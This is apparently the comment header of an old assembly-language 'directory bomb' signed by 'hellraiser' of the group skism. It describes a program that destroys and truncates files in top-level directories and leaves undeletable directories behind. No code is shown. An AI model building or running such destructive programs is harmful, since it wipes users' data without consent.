;skism directory bomb v1.00

;written by hellraiser

;this is a lame bomb consisting of repetative/error full code
;but it gets the job done
;when run this program will start at the first directory from the root
;and trash all files in first level directorys
;then create a directory in place of the distroyed file name

;it will also create a semi-removable directory called skism

;yes bombs are very lame, and be advised, this is the only bomb
;skism shall ever write... but we must try everything once

;be warned, the tech used by this program does not only erase files but
;it will also truncate them to 0 bytes, the skism method.
